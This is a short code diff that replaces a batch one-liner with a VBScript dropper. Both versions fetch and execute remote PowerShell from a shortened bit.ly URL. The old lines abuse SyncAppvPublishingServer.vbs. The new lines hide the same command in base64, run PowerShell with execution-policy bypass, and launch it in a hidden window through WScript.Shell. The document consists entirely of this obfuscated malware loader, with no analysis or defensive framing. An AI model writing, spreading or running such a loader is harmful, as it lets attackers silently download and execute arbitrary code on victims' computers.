@@ -1,2 +1,5 @@
-@ceho off
-SyncAppvPublishingServer.vbs Break; iex(iwr -usebasicparsing https://bit.ly/3oEVjOu)
+command = "powershell.exe -exec bypass -enc UwB5AG4AYwBBAHAAcAB2AFAAdQBiAGwAaQBzAGgAaQBuAGcAUwBlAHIAdgBlAHIALgB2AGIAcwAgAEIAcgBlAGEAawA7ACAAaQBlAHgAKABpAHcAcgAgAC0AdQBzAGUAYgBhAHMAaQBjAHAAYQByAHMAaQBuAGcAIABoAHQAdABwAHMAOgAvAC8AYgBpAHQALgBsAHkALwAzAG8ARQBWAGoATwB1ACkA"
+ 
+set p = CreateObject("WScript.Shell")
+ 
+p.Run command,0
